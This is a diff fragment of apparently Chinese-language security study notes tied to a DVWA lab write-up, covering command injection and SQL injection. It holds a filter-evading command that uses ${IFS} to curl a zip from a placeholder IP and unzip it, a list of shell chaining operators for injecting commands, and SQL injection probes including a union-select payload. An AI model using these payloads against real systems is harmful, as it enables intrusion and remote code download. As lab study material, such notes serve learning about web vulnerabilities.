@@ -222,3 +222,22 @@ select User from mysql.user where User='-1'=1='0';uname的查询结果与'-1'比
            curl${IFS}-o${IFS}2.zip${IFS}http://xxx.xxx.xxx.xxx/2.zip
 
 unzip${IFS}2.zip
+   http://blog.spoock.com/2016/04/05/dvwa-writeup/        
+命令连接符和管道：在shell中可以使用命令连接符或者是管道的方式同时在一条语句中同时运行多个命令。
+| 管道符，将上一个命令的输出作为下一个命令的输入
+& 连接符，使用&符号时，就可以同时运行多条命令
+； Linux环境下的连接符，和&作用相同
+&& 逻辑与，只有在前面的命令执行成功时，后面的命令才会执行
+|| 逻辑或，前面的命令如果执行成功，后面的命令则不执行           
+           
+ >>> php_uname('s')
+=> "Windows NT"
+>>> php_uname()
+=> "Windows NT PC-20140111UGXV 6.1 build 7601 (Windows 7 Ultimate Edition Servic
+e Pack 1) i586"          
+           
+1’ 或者使用 1 or 1=1# 同样可以，那么说明就存在sql注入漏洞
+
+ 
+%' and '0'='0
+%' or 0=0 union select null,version() #
